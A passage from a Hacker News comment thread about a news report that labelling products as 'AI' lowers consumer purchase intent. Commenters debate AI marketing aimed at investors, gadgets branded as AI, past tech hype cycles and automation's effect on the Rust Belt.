easily\" mindset, but this goes all the way back to the other direction. People do not need an AI to \"analyse the laundry type and size to inform itself on how much detergent to use\", just press a couple buttons. If this is where people's imaginations are going with AI then no wonder some people look at AI like another web3 situation. reply poikroequ 14 hours agoprevAI isn't being marketed to consumers. AI is being marketed to investors. Regardless of whether or not it boosts sales, so long as it keeps driving up the stock price, they'll keep tossing around the word AI. reply jameshart 13 hours agoparentI don’t watch a lot of broadcast TV but had some live TV up during the Olympics. Every ad break included ads for Microsoft Copilot, Google Gemini, and Salesforce Einstein. We are in a full on AI product marketing cycle. reply Terr_ 13 hours agorootparentTrue, but there's a lot of room for ulterior motives there too. I mean, some of it may be about getting end-users to pay for AI-thingies, but running the ads can also be seen as investor-posturing even if if it doesn't say \"buy our stock\", and there may be a corporate goal of boosting the (free) usage-numbers in order to present that to investors, etc. reply rchaud 5 hours agorootparentWe saw the same thing with crypto ads dominating the Super Bowl a couple of years ago and gambling apps during the NBA playoffs. TV advertising for major sporting events is a \"flex\" as so few companies can afford the cost of a national ad slot. The ones that do usually have money to burn from investors. reply Terr_ 1 hour agorootparentTo be fair, the line between crypto speculator and crypto customer is very thin indeed. :P reply bsenftner 8 hours agorootparentprevI just returned from vacation in Wisconsin, where the Olympics were on everywhere. Every single time an ad prompting AI came on, people loudly booed, and it was not uncommon to hear \"don't be a sucker!\" and \"fuck that bullshit\" yelled out. When I asked, people would say \"I'm not stupid, I'm not touching AI anything.\" reply kkielhofner 8 hours agorootparentI grew up and live in small town Wisconsin. Sounds very believable. I say this with the utmost respect and concern for my friends, family, and neighbors: This attitude is part of the reason why the rust belt exists - filled with towns and cities that are a shell of their former selves. Areas of constant economic hardship, endemic drug use, etc. The two big factories in the town I went to high school in are closed. Needless to say things aren’t going well… Yelling at the TV didn’t do anything to prevent that and it’s not going to do anything to prevent the next wave of it. It’s harsh, but an important lesson since the beginning of time: Adapt or die. reply shafyy 7 hours agorootparentI disagree. It's good that people scrutinize and resist corporate greed. Accepting that \"AI\" (whatever that means) should be in every single product I use is not adapting. It's bending over. People have the power to vote with their wallets (and their actual votes), and they should do so. Now, I'm not American and not an expert on the Rust Belt, but I'm pretty certain this is not the reason why the Rust Belt exists. Probably rather something to do with corporate greed and greedy politicians. reply kkielhofner 7 hours agorootparent> It's good that people scrutinize and resist corporate greed. I agree. Problem is it didn't do anything when they were saying the exact same things that led to the closure or significant job loss of the manufacturing that was the core of these communities: 1) \"Hah, my factory job is complicated. The Mexicans, Chinese, Japanese, etc will never figure it out.\" Racist/xenophobic but said at the time. Even more wrong. 2) Look at robotics. It also took some time for the technology to develop and many of these same people looked at early implementations and thought the exact same thing: \"Oh those robots don't really work and they never will\". Then their factory jobs became a fraction of the head count with a completely different skill set... Throughout history this has played out over and over again. > People have the power to vote with their wallets (and their actual votes), and they should do so. Key word being /should/. Yet it has been proven time and time again that people regularly vote against their own best economic interests in the ballot box and with their wallets. The same people who laughed at and dismissed the Chinese are going to Wal-Mart everyday and buying goods from (you guessed it) - China. They're also voting for the same corporate-funded politicians. For many of these people their best option now is working at the large Amazon warehouse down the road where they pick and pack goods largely from (you guessed it again) - China. But even then there just aren't that many of those jobs and as the horror stories reported in the media show they're routinely abused there. > Now, I'm not American and not an expert on the Rust Belt, but I'm pretty certain this is not the reason why the Rust Belt exists. Next time you're in the US visiting New York, California, Florida, etc come visit the rust belt in \"flyover country\" and see just how devastating the effects of this are. I see and live it (to some extent) everyday. > Probably rather something to do with corporate greed and greedy politicians. A huge factor and the ultimate root of the problem but back to voting, wallets, etc: in the real world this isn't going anywhere and from what I see it's just getting worse. My concern comes from seeing the blight and literal deaths in MY community. My concern now is AI is coming for the white collar workforce as well. Another old adage: \"Don't underestimate your enemy/competition\". reply shafyy 4 hours agorootparentI agree with most of your points. However, I stand by my point that corporations looking to cut costs moved those production jobs abroad. This will happen time and again under capitalism. I think blaming the working poor is not the right conclusion to draw. The only way to prevent this is to reign in capitalism. Neoliberalism does not work. > Yet it has been proven time and time again that people regularly vote against their own best economic interests in the ballot box and with their wallets. Unfortunately, yes. People are strongly influenced by propaganda. Propaganda is often bankrolled by corporations. A good start with be curb lobbyism and make it more transparent. reply whatwhaaaaat 6 hours agorootparentprevThis could be a really funny comment in 5 years if the plagiarism generators actually worked. You could be out of a job with as little control of the whole situation as those rustbeltians you have such disregard for. NAFTA and globalism killed the rustbelt. The refusal of auto plant Larry to learn Java didn’t. When you ship off a persons job in mass this is what happens. reply kkielhofner 6 hours agorootparent> You could be out of a job with as little control of the whole situation as those rustbeltians you have such disregard for. I'll admit I was a bit angry and offended when I first read this. Did you miss the part about how horribly this has affected my friends, family, and neighbors? I say this expressly out of concern and literal, actual love. Where do you live? > NAFTA and globalism killed the rustbelt. As I said in my other reply the generation before this one also outright dismissed the ability for Mexico, China, etc to take their jobs. In any case it certainly wasn't prevented. > The refusal of auto plant Larry to learn Java didn’t. Again, as I said in my other reply what little manufacturing is left is a fraction of the jobs with a completely different skill set - CNC programming, etc. While you're off on Java because (frankly) you don't know what you're talking about it's pretty much exactly this. reply alephnerd 5 hours agorootparent> While you're off on Java I think OP referenced Java because it was the hot language of the 90s/early 2000s that people would harp on about studying. Sort of like how people nowadays go to bootcamps to study JavaScript and Python reply whatwhaaaaat 5 hours agorootparentprevI live in the Midwest. I don’t know what all your other reply’s to other people say. I’m not sure what your point is substituting one language for another - you can’t take a guy who’s painted cars his whole life and retool him to “cnc programming” even if the lathes didn’t git moved with the rest of production. The c suite did hit their stock goals tho so at least that is good! If you’re telling a blue collar worker who’s been laid off “adapt or die” then you have contempt for those very love ones you claim to sympathize with. reply danaris 6 hours agorootparentprevYour position is ahistorical. The Rust Belt exists (primarily) because the companies who owned all the big manufacturing in the late 20th century outsourced all of that labor to Asia. If people who live there have a higher-than-average distrust of big corporate bullshit, it's an effect of being abandoned by them, not the cause of it. reply goatlover 7 hours agorootparentprevOr they have developed a good filter for BS marketing. The markets can adapt also. reply kkielhofner 6 hours agorootparent> Or they have developed a good filter for BS marketing. Maybe. Or (maybe) yelling at the TV is a lot easier (and more visceral) than thinking \"Hmm, this whole AI thing just might work out. Maybe I should treat the threat seriously this time just like my dad should have with the Chinese, robots, etc\". As I said in my other reply it's generally not a good idea to outright dismiss what is even in the early stages a pretty clear potential threat to your livelihood. > The markets can adapt also. This can mean nearly anything and I'm not sure what you're trying to communicate in this context. reply glimshe 8 hours agorootparentprevThis isn't much different to some of the early reactions to computers... reply te_chris 11 hours agorootparentprevThat’s uniquely American. reply the_other 10 hours agorootparentIn the UK, Google and AWS have been advertising AI-based tools or AI-supporting services on TV recently. reply lazide 10 hours agorootparentprevMost major investors are American - in this space anyway - or mediated through American investment companies. So…. reply xbmcuser 12 hours agorootparentprevIt is still not marketed to you the same way the millions of ads you see of prescription drugs that can only be prescribed by doctors are marketed on tv. reply sph 12 hours agorootparentOf course the drug ads are marketed to you, so you go and get a prescription from your doctor. Likewise, everybody and their dog has ChatGPT installed and think of AI as this magical thing that's gonna change the world, so they are potential indirect customers. reply yurishimo 12 hours agorootparentDoes everybody really have ChatGPT installed? I, and most of my colleagues at work in the development department, don't use ChatGPT for anything. A couple of us use Copilot-esque tools, but even then, the suggestions are almost always useless. reply carlmr 11 hours agorootparentI have used ChatGPT a few times instead of looking up documentation. It can give you a better start point for common stuff, like draw a scatter plot with upper and lower limits with matplotlib. I then tweak the example to suit my needs exactly. But it takes away only a small amount of busy work. It's not as helpful as AI proponents make you believe. reply sph 8 hours agorootparentprevI don't use any form of \"AI\", and I'm a software engineer. At least two of my friends, who don't work in software, have somehow learned about ChatGPT and routinely use it for whatever. reply taylorius 7 hours agorootparentprev\"Of course the drug ads are marketed to you, so you go and get a prescription from your doctor.\" The main purpose of Big Pharma's saturation advertising spend on TV networks is the buying of influence with those networks - not marketing, secondary or otherwise. reply dredmorbius 6 hours agorootparentPardon? reply siquick 9 hours agorootparentprev> Likewise, everybody and their dog has ChatGPT installed It’s a fraction of a percent of the population that have used it. reply taneq 5 hours agorootparentA rather improper fraction, though. Pick some random non-techie person and they'll have at least tried it. reply elif 7 hours agorootparentprevAfter spending time abroad you begin to realize just how insane these commercials are. Only the US and like Australia allow these weird doctor-bypass medical advice/brainwashing sessions. reply jrflowers 14 hours agoparentprev> AI isn't being marketed to consumers. This makes sense if you ignore every single example of AI-based features popping up all over consumer-facing services reply maxbond 13 hours agorootparentIt's literally true that it is being marketed to consumers. GP was being somewhat poetic. Marketing to consumers is an instrumental goal in service of marketing to investors. The aim is to sell more stock to investors rather than more product to consumers. That being said, GP has made the implicit assumption that they can't market it to investors as AI and to consumers as something else, and if investor interest in AI doesn't ebb, then I expect they will find a way to do just that. reply eastbound 13 hours agorootparentAI is impossible to pitch to customers because its performance is not measurable. Could be good one day (remember Siri in 2017?) and crap the next. How would you pitch a feature with erratic behavior? reply Jedd 13 hours agorootparentHang on - 87% of end-customer marketing is already aspirational, potential quality (of life) - over measurable, quantifiable - outcomes. To your second question, I believe a popular adjective might be 'invigorating'. reply layer8 12 hours agorootparentprev> How would you pitch a feature with erratic behavior? As \"creative\", \"diverse\", and \"enriching\". ;) reply lazide 10 hours agorootparentAlso ‘exciting’ and ‘an adventure to use’. reply add-sub-mul-div 14 hours agorootparentprevBelieve me, I'm trying. reply Yeul 9 hours agorootparentprevYep I have Edge here on my phone and I quote \"the AI browser\". So yes I do see it in marketing. reply bakugo 13 hours agorootparentprevThey are popping up all over consumer-facing services because investors want them, not because consumers want them. reply jrflowers 13 hours agorootparentAI being literally marketed to consumers in order to court investors is not the same thing as “AI is not being marketed to consumers” though reply fullshark 6 hours agorootparentOP was trying to be clever (i.e. the key audience for this marketing is actually investors), most everyone else understood their meaning I believe. reply sergioisidoro 11 hours agoparentprevYesterday I went to buy an electric toothbrush and some were marketed as having \"AI\". This thing is reaching astronomical bandwagon proportions. reply jajko 10 hours agorootparentWell at least you can switch your crypto mining toothbrush with AI infused one that will analyze movements of your hands and once sold to insurance brokers conclude you have an old injury and are a risky driver raising your insurance premiums. reply tim333 6 hours agorootparentI was thinking \"AI\" is the new \"blockchain\". reply petabyt 14 hours agoparentprevBig investors get a boner when they think about AI. So founders get FOMO and shove it into everything. reply nineteen999 13 hours agorootparentNot that much different from the recent crypto bubble TBH reply eddiewithzato 12 hours agorootparentstarted with crypto -> blockchain -> NFT -> AI what’s the next big bubble? reply AshamedCaptain 9 hours agorootparentCan I ask for one that does not involve GPUs? reply rsynnott 12 hours agorootparentprevYou missed metaverses. Also there was another AI one; there was a smallish computer vision oriented bubble early last decade. Main product was a lot of money wasted on putative self-driving cars, but there was other stuff. reply prmoustache 7 hours agorootparentI don't think metaverses really interested anyone appart from Facebook in recent years. Who invested in those really? I think everybody remember that all but a few addicts got quickly bored of second life in the mid 00's and it was not worth trying a second time. reply dredmorbius 6 hours agorootparentprevAlso wearables, VR/AR (possibly included in your computer-vision category), 3DTV, nanotech, tablet computers (possibly breaking out), brain-computer interfaces, IoT (AI is the new IoT, IMO), 3D printing, Big Data, Theranos (and other highly-customised healthcare, think 23andMe). reply rsynnott 5 hours agorootparentOh, huh. Totally forgot about IoT, yeah. I think tablet computers are a _bit_ different; they were never really sold as changing the world, and have carved out a definite niche (certainly more so than any of that other stuff). reply dredmorbius 27 minutes agorootparentTotally forgot about IoT That's harsh, dude! ;-) Tablets: These should be revolutionary. In practice, they're not, and I'm trying to sort out why. The biggest gripe is that there's no single use for which a tablet is a preferred option, other than as an e-book reader, and numerous others for which it is distinctly less-than-optimal, with smaller smart (or \"dumb\") phones being better for on-the-go comms, and full-featured laptops or notebooks being preferably for virtually all compute applications. I'd made that case in a Diaspora* post a few years back: . The most detailed critique is in this comment to that thread, with a (sorry, poorly-rendering at most screen-widths) table:I've used tablets for about a decade now (first an Android Samsung device, 3+ years on an Onyx BOOX e-ink ebook-reader, though it's really an Android tablet), and my assessment of them as less-than-serious compute devices remains, even with the addition of an external keyboard and Termux (a Linux-on-Android environment). There are simply too many compromises from the Android environment. And everything I've seen about iOS suggests that they would be worse as a general-compute device, despite some clear wins over Android/Google/Samsung elsewhere. I'm not sure if tablets can break through or not. I'm leaning increasingly to a number of independent devices: tablet (for ebooks and podcasts), laptop (for real work), a small phone, preferably feature, possibly something like the Light Phone, independent image/video and audio capture (dedicated camera, point-and-shoot or DSLR, handheld audio recorder, see NYT's reviews:... and note that reporters make heavy use of such equipment). At this point I'm not even sure I want a general-purpose phone of any sort given the heavy abuse of that channel (smishing / robocalls / fraud / harassment), though a wide-spread alternative doesn't seem to have emerged yet. reply glitchc 6 hours agorootparentprevBI aka Business Intelligence of course /s reply diego_sandoval 12 hours agorootparentprevIf it comes back to the \"bubble\" price and surpasses it less than 3 years later, was it really a bubble? reply teeray 6 hours agorootparentprevIt's like self-driving cars and Uber. The investor wet dream is to fire all your expensive salaried employees and replace them with an AI slave. reply blitzar 10 hours agorootparentprev... shove it into the pitch deck and nowhere else reply b3ing 5 hours agoparentprevExactly, I had an interview at some company last year that had AI in their name and got a million invested in them. I read their website and saw nothing that really showcased AI it seemed like just something you could code with basic filtering. The interview felt like I was consulting them on what to do next and I probably should of been paid. reply geuis 14 hours agoparentprevExactly. Marketing dollars come from investors. A big part of modern marketing for startups is spending tons of investor money to \"grow\" quickly. How long the fire burns doesn't matter, it's all about throwing dried out February Christmas trees onto the flames for quick bursts of flame. reply glimshe 8 hours agoparentprevYesterday I went to a college entry prep seminar for my kid and they were selling a \"personalized preparation plan created by algorithms and AI\" reply Gigachad 14 hours agoparentprevHuh? Samsung has adverts all over the place about how their phones have AI. They don’t even talk about what it does. Just that they have AI. reply sumedh 8 hours agorootparent> They don’t even talk about what it does. Fix photos? reply quicklime 14 hours agorootparentprevEven their washing machines have AI! reply maxbond 13 hours agorootparentI've seen this and it's very silly. Every step where the machine makes an automated decision, it displays a message like, \"using AI to xyz.\" I have to imagine the \"AI\" to determine how long the cycle should be is a linear function of some metric like weight. But I suppose you could view that as a neural network with a single neuron. reply animuchan 12 hours agorootparentMoreover, any hardcoded behavior can be seen as a neural net with no neurons! Maybe the real AI was the friends we made along the way. reply computerthings 12 hours agorootparentprev> AI Bubble which mixes water, air and detergent to create a cleansing foam that seeps into your fabrics -- https://soyacincau.com/2024/05/15/samsung-bespoke-ai-laundry... If you can't defeat the people talking about the AI bubble, join them? reply Animats 12 hours agorootparent\"AI Bubble which mixes water, air and detergent...\" It's so Samsung. Back when Internet of Things was a thing, I went to an IoT meeting in SF where one of the speakers was from Samsung. They had a refrigerator with a tablet built into the door. The tablet and refrigerator shared nothing but power, and cost more than a comparable refrigerator and tablet separately. I asked the speaker why they built this, and was told that there's a fraction of the market that likes to show off their kitchens who will buy this stuff. reply yurishimo 12 hours agorootparentIt's still very much a product that you can buy. One of the \"features\" was being able to look into the fridge with an inward facing camera from your phone while you're away from home. Potentially useful if you really can't remember what you have while at the grocery store. One problem... it only showed 3 shelves on the fridge side. You couldn't PTZ the camera around the entire fridge. No way to see the stuff stored in the door. No way to check the freezer, etc. Most reviewers concluded it was practically useless. reply netsharc 10 hours agorootparentI can imagine a fridge with an (outside) camera that can take a picture of your groceries (make the user hold it for a fraction of a second in front of the camera) and categorize it as well as see its expiration date (or estimate, e.g. for fruits and vegetables) would actually be useful, considering we throw away so much food. And if it can't identify the item, it can even ask the user to identify the item (\"pasta I made last night\") and how long they think it will last. If it's made by a committee of idiots, it will just repeatedly say \"Cannot identify item. Please name this item.\"... if it's actually good it will just have different beep tones for different states (Beep A: \"All good\", beep B: \"Can't identify item\", beep C: \"Can't see expiration date\", etc) reply photonthug 8 hours agorootparentprevBut this is a great example of something no one has ever asked for. Even the suckers buying it never wanted it, they would just buy “top of the line” no matter what useless “features” that means. For corporations I’m sure they like whatever cash they squeeze out of whatever percent of people have this “get the most expensive offering” strategy but it seems likely the end goal is more about gradually normalizing more expensive offerings at all levels. After you get there, you can start removing useful things that justified cost originally (like headphone jacks) to push whatever else people now need (ear buds). Smart phones are the obvious example of this sort of thing, where major carriers will basically force customers to get use either the latest iPhone or android, and then act like your existing phone is a potato and you must be crazy to think that they could make it ring. Not just a push to require smart phones but the latest ridiculously large one with features no one cares about, at a price point that it becomes a major investment for many households, and now needs a payment plan. whereas logic,progress and naive expectations of capitalism would suggest that such things would be getting cheaper, and represent a *smaller* chunk of your monthly wages. See also the similar situation with everything from smart tvs to toasters. I try to enjoy experiences with flashlights and paper maps while these things are still available. If toothpaste were invented today it would be engineered with a short shelf life and require a subscription reply synicalx 14 hours agorootparentprevCan't wait for my washing machine to be able to make an API call to OpenAI so it can worked out how best to tackle the stain on my undies. We really are living in the future. reply jajko 10 hours agorootparentNo internet / dns fail / openai failed patching and bam! Whole world wears dirty clothes. I hope EU will make this illegal if it isnt yet, they seem to be the only real power these days not giving a fuck about revenues of corporations in the first place when deciding stuff. reply netsharc 10 hours agorootparent\"This stain again, week after week? Ordering fibrous cereal from Amazon...\". reply Log_out_ 13 hours agoparentprevArent the Investors the main consumers for software goods by now? The customer consumer (cc) is just a stage to mass adoption on the way towards en-shitification, basically some late stage fracking process chemical, needed yes, but not a decisionmaker when it comes to drilling. reply evilfred 13 hours agoparentprevevery time I see the AI box in Clickup I cringe. it is being marketed to users we just all avoid it, as the story says. reply AbstractH24 6 hours agoparentprevIt’s a catch-22 You need to put AI to raise money or appeal to a broad swath of consumers, but educated consumers and enterprise buyers are increasingly rolling their eyes at it. reply bushbaba 13 hours agoparentprevYou’d be shocked at how brain dead the csuite who influence buying decisions can be. Oh walstreet cares about ai. What’s our ai plan. Internal team, we are buying a new AI dev product that’ll reduce headcount needs by 10%. Csuite sounds great! reply jillesvangurp 11 hours agoprevIn the same way, you should stop mentioning mobile, apps, the web, and other past over hyped stuff. That doesn't mean you should stop investing in doing those things well. It just means that you need to focus on the value you deliver to your customers through doing these things well. Everybody has an app. Having an app is not a distinguishing factor any more. In the eighties and nineties, companies slapped the word digital on just about anything. Especially on things that were very much analog. That doesn't mean computers flopped; they are very useful. It's a meaningless distinction to add the digital to a brand. AI is the same thing. It's a means to an end. You need to be talking about what you deliver with it. Not about how you deliver it. In the case of CNN that hosts this article, a lot of their content probably is at this point passing through some LLMs at this point. They don't have to advertise that of course. If they do their job right, you barely notice this. Arguably, they should be doing a lot more with AI than they are doing already. The news business is fiercely competitive. Margins are small, and they have to produce more content with fewer people. LLMs can help them do that. reply nottorp 11 hours agoparent> Having an app is not a distinguishing factor any more. Having an app is \"fuck you, i don't want to install another app\" these days... reply pleb_nz 10 hours agorootparentI prefer apps and desktop apps when they are available. They feel and work nicer mostly than web based. But we live more and more in a browser world and there is less and less choice and I understand I must move with the times. reply nottorp 10 hours agorootparent> They feel and work nicer mostly than web based. The \"apps\" i'm talking about are just the web site packed into a crap and resource hungry web view... reply worksonmine 9 hours agorootparentAnd requires access to my contacts for some reason. reply nottorp 8 hours agorootparentMost of the time it's just incompetence, they import the 1823 js libraries and ask for all the permissions their libraries could use in that corner case that happens once every 1760 years. reply prmoustache 7 hours agorootparentprevI prefer apps when they work mostly offline and don't try to send my private data to various third parties. I tend to prefer the browser which allows me to control a little bit more what it does for everything else. reply andybak 10 hours agorootparentprev> But we live more and more in a browser world and there is less and less choice and I understand I must move with the times. Wow. Has everything gone full circle again already? I thought we were all still complaining about the death of the web and the app-ocracy. reply madaxe_again 11 hours agorootparentprevIt has been for decades. Also, people don’t know what the hell they want or are talking about - so often people tell me they have no apps on their phone, they don’t like apps, they’re bad and wrong - and then I see they’ve got Facebook, instagram, 10 candy crush clones, etc. “what about those?” “Those aren’t apps. Those are things.” My mother has total disdain for “social media users” yet spends six hours a day on Facebook. She doesn’t see it as social media. “It’s more of a virtual parlour” So yeah. People don’t know what the hell they want or are talking about. reply nottorp 7 hours agorootparent> has total disdain for “social media users” What's social media today anyway? I've been told the likes of whatsapp or discord are also social media. But they're just chat apps to me because you use them to chat with other people and they don't have automated systems that cram cat pictures down your throat. reply prmoustache 7 hours agorootparent> and they don't have automated systems that cram cat pictures down your throat. Yes they do. It is your aunt who is crazy about cats. Nearly every family has one. reply nottorp 6 hours agorootparentIt’s a crazy aunt on WhatsApp, it’s not an engagement algorithm. Does your Facebook even show you your aunts posts? I have a feeling it’s stopped showing friends and relatives for me ages ago. reply prmoustache 3 hours agorootparentSorry that was just a tongue in cheek joke. reply will5421 10 hours agorootparentprevThey know what they want, just not what they’re talking about. reply lazide 10 hours agorootparentOr they know what they want, and what they’re talking about - in the sense of denial and projection anyway. reply resonious 8 hours agoparentprevMy air conditioner's instruction manual had a whole \"we have an app!\" thing on it. I installed it for funsies. I noticed pretty quickly that there was no button for changing the temperature setting. All you can do is turn the thing on or off. Turns out, there's a button for \"advanced settings\" that takes you to a webpage. On that webpage, you have to log in again, but once you do, you can change temperature, create timers and do all kinds of things. Completely insane design. I bet they built out the webapp first, then some PM type went in and was like \"no, we need an app\" and forced them to build a \"native app\". Then they ran out of time and just put a link to the website in the app. reply fhd2 10 hours agoparentprevI agree, and it's probably what the article is about. These terms have meaning for a little while, then they get abused (see your \"digital\" example), than they become meaningless and even sound antiquated. I agree with a lot of the siblings though: \"AI\" features themselves are so often seemingly just pushed on users, and it doesn't look like they were thought through, well implemented or tested. My main annoyance with this these days is that absolutely every app and device seems to have decided they need to push an \"assistant\" on me. I personally hate the assistant UX, and I wish I didn't have to close so many banners for apps to leave me alone with that. I get that they're trying to show their investors that their \"AI features\" get \"engagement\", but it seems... desperate. Even if they don't call it \"AI\", but just by the value it supposedly provides (e.g. \"assistant\"), it still annoys me quite a bit. I wonder how other consumers (especially non-technical people) feel about that part. TFA doesn't really seem to go into it. reply loa_in_ 9 hours agorootparentThe article is based on: we did some stats on ads and sales of various brands and found that certain words impacted sales negatively in last quarter. That's it. reply edanm 7 hours agoparentprev> AI is the same thing. It's a means to an end. You need to be talking about what you deliver with it. Not about how you deliver it. This is true, but AI is new enough tech that it is reasonable to say \"this thing wasn't possible to build three years ago, now it is possible to build, and we built it!\". That is definitely a good pitch to investors, and in some cases, directly to customers. That is not something you can say about mobile apps - like you said, it's not a distinguishing factor any more. But it is a factor for AI, in some situations. reply roshankhan28 11 hours agoparentprevi get what you are tryig to say, but i guess what OP meant was if every company ties up AI in their product just because they are calling Chat GPT API in the backend, then every product is essentially the same. i guess with time developers will also get to make and train inhouse AI models if in future it gets more affordable reply joegibbs 15 hours agoprevI think avoid any kinds of buzzwords like AI, high tech, whatever and just focus on what it actually does, which is a lot more impressive. You can try to wow the customer with a bunch of words but it’s all fluff - and everyone is implementing AI now, and usually these “implementations” are ChatGPT with RAG on the docs or something else that everyone’s done before. What you end up getting is only slightly better than typing in chatgpt.com. If you’ve managed to get something that solves a problem just explain what it does to solve that. reply fsckboy 14 hours agoparentyou don't realize it, but you are suggesting bog standard marketing advice: \"Customers don't buy features, they buy benefits. You need to point out how your product benefits the customer.\" Around here that would correspond to \"addressing pain points\" \"People don't want to buy a quarter-inch drill; they want to buy a quarter-inch hole.\" - Ted Levitt HBS reply CoastalCoder 4 hours agorootparent> \"People don't want to buy a quarter-inch drill; they want to buy a quarter-inch hole.\" Nah, speaking for plenty of guys, I'd say we want the drill. Maybe with an impact hammer too, of we can afford it. :) reply resonious 8 hours agorootparentprevI guess even big corps like Microsoft need this reminder. GitHub's front page says \"The world’s leading AI-powered developer platform.\" reply smugglerFlynn 5 hours agorootparentThey probably ran A/B test and this wording led to increased registrations rate. Not sure why everyone instantly assumes product teams are not aware of marketings basics. It is consumers driving how the products evolve, not the other way around. reply pnt12 3 hours agorootparentI think that's a very forgiving perspective. Product teams are often wrong, and A/B tests can lead to inferior long term solutions. As always, it's best to criticize the idea, not the people. reply rsynnott 12 hours agoparentprev> which is a lot more impressive. Ah, well, there you run into a problem. Generally consumer ‘AI’ is pointless, and is there only because the markets are (or at least were; there are some indications that this may be ending) fixated on AI. reply mcv 10 hours agorootparentThere may well be valid applications of consumer AI, but I don't think we've seen any good ones yet. Most consumer products currently clearly use AI as a marketing buzzword. Most blatant example I've seen is Logitech's AI mouse. reply CaptainFever 14 hours agoparentprevYeah, it's the same way that \".com\" or \"online\" used to be buzzwords too, that nowadays just feel kind of cheap. If most things have AI, then simply saying you have AI doesn't really mean much. Sell the solution, not the technology, etc. reply jhbadger 14 hours agorootparentReminds me of ancient motels (with signage that probably hasn't been updated in decades) that proudly announce that their rooms are air conditioned and have color tv. Not that those aren't nice to have, but they are pretty much expected today. reply ablation 13 hours agorootparentThe Kano Model in action: https://en.wikipedia.org/wiki/Kano_model reply theGeatZhopa 12 hours agoprevIt's also turning me away. Not because I don't like or fear AI. It's because I know, the usages of AI in names of products is a sure sign for incompetent marketing, who doesn't know what to do and who is desperate. I wouldn't buy from marketing that is desperate to sell things after they dictated them. reply vladvasiliu 11 hours agoparentI never really bought the whole AI marketing spiels either, but I kinda understood the angle. They don't really know what they're selling, etc. But what really shocked me, was when people on the client side are asking suppliers if they're not working on anything AI-based, since everyone is doing it. But those people did always give me the vibe you're talking about: \"they don't know what to do and are desperate\". I guess my point is that maybe, at least some of the time, marketers aren't that stupid. reply theGeatZhopa 10 hours agorootparentI didn't want to express that marketeers are stupid or so. In the opposite, it's an art to sell features. But having a product, like the mentioned washing machine in some thread here, and putting AI into the name is a sign of desperation for me. \"We need a feature every other also might have.. let's put AI in the name and sell it twice the price\" Anyway, when you start asking what AI is doing there, you'll realize it's just a simple sensor reading and thresholding (which AI is all about) I can't imagine a product with true AI - what is true AI? :) reply lazide 10 hours agorootparentprevTrying to convince your customers they’re stupid for wanting what they want is generally a pretty dumb marketing/sales tactic. reply resonious 8 hours agoparentprevYup. I've been seeing older products that I've used for awhile suddenly claim that they are \"AI-powered\" when I've never once used an AI feature of theirs (and often didn't even know they had one). Does not instill confidence. reply Iulioh 8 hours agoparentprevNot only. It it's a \"real AI\" (and by that i mean ChatGPT) it means that not more than a year later it will need a subscription to work. reply pyeri 15 hours agoprevAt least when it comes to apps and software, the term \"AI powered\" automatically gives me the impression of \"bloated crapware\" these days! But I'm sure sales folks must be making good use of that term to get more projects and revenues from non-technical or less aware managers. reply Gigachad 14 hours agoparentIt gives me the vibes of those NFT companies from a few years ago. All marketing, no substance. reply bruce511 13 hours agorootparentI'd agree the marketing vibe is very hype-y. And just like every other hype cycle (crypto, and nft included) it feels very scummy. But there's a lot more substance behind AI than NFTs. As much as the hype? Maybe not. More than 0 (NFTs had 0 substance)? Very much so. I'm more hype-adverse than the next guy, but I've gotten value from AI (just plain old ChatGPT) recently as I've deep-dived into a new area. It's kinda like having a tutor in the room to whom I ask questions as they occur to me. My \"tutor\" isn't perfect, but neither are humans, Google, or the internet. So I wouldn't categorize this as \"no substance\". There is a lot of substance here, even if it's not quite as much as the marketeers are selling. reply Nullabillity 5 hours agorootparentThat's a lot of words to say nothing. reply aikinai 14 hours agoparentprevCrapware maybe, but I don’t see a correlation between AI and bloat. If anything, AI features are correlated with less bloated software since the AI is supposed to smooth over complexity. And some companies are using it to deliver real value. Adobe has been killing it with AI features. I switched back to Lightroom and Photoshop specifically for the new automasking, generative AI fill and such. reply kube-system 14 hours agorootparentFew in the consumer mass market have ever even opened photoshop before. The average person’s experience with “AI” is Siri telling them “I found this on the web” as a response to half of their questions. Or some streaming service suggesting a show they don’t want to watch. Or the Will Smith spaghetti meme. People who understand LLMs are on average fairly excited about what is happening recently. But those who don’t know what LLM stands for are skeptical about why anything today is going to be better than the last 20 years of snake oil “AI”. reply l33t7332273 13 hours agorootparentMany people who do know what LLM stands for (and could implement the architecture themselves) are also skeptical about why anything today is going to be better than the last 20 years of snake oil “AI”. reply lawn 11 hours agorootparentprevI'd say that many who know how LLMs work are both excited and annoyed at the hype machine that overstates their current and future capabilities. reply autoexec 13 hours agorootparentprevAnd some companies are doing massive amounts of harm with AI https://arstechnica.com/health/2023/11/ai-with-90-error-rate... What passes for AI these days is a fun toy, sometimes a useful one, but it isn't anything I want to have to depend on. reply SpicyLemonZest 14 hours agorootparentprevI wouldn't deny that some companies are using it to deliver real value, but I feel like the typical case I see is barely above the level of the Logitech AI mouse. (For anyone who's not familiar, the mouse itself doesn't use AI in any way - it just has a built-in keybind to a ChatGPT integration, and of course is sold at a $10 premium to the same model with no AI button.) reply patwolf 6 hours agoprevI keep an eye on the market of small SaaS businesses for sale. Lately a majority are something like \"A simple tool that uses AI to X\". I immediately skip past any company like that because that tells me that 1. the company is very young and doesn't have enough history show clear revenue trends, and 2. the product is probably a thin wrapper over ChatGPT and has no moat among a dozen other tools that do the same thing. reply happosai 14 hours agoprevThere is very few things in world that feel as repulsive as the glowing \"AI\" button in our Jira. reply worthless-trash 14 hours agoparentMy instance doesn't have this, and I'm kinda glad that it has not been enabled. reply ks2048 14 hours agoprevI thought for a few years at Apple keynote presentations, they were saying \"machine learning\" while Google was saying \"AI\" hundreds of times. I assumed because they thought \"AI\" had a privacy-invasion or anti-human connotation to it. But, then this year they came out with \"Apple Intelligence\", which people will just see as \"AI\". So, I guess they finally gave up on that. reply whywhywhywhy 5 hours agoparentWeird how calling it Apple Intelligence is the same thinking as Jack Ma calling it \"Alibaba Intelligence\" https://www.youtube.com/watch?v=ulqRsqD0R64 reply rsynnott 12 hours agoparentprev‘AI’ became a bit of a term non grata after the last big AI bubble popped in the late 90s, and people just called everything machine learning or similar. Google was merely more willing than Apple to try reviving it; up until recently very few companies dared use the term. reply rahkiin 12 hours agoparentprevI like they still do not really use AI but capitalized on the hype still. But they presented actionable features with intelligence behind it unlike many companies. With Apple Intelligence it can be whatever they want it to be. Could be ChatGPT, could be rule based. AI is now being linked to ChatGPT/conversational for many people reply braza 12 hours agoprev> A study published in the Journal of Hospitality Marketing & Management in June found that describing a product as using AI lowers a customer’s intention to buy it. For the ones interested in the actual study instead the headline, this is the link for the original paper: Paper page: 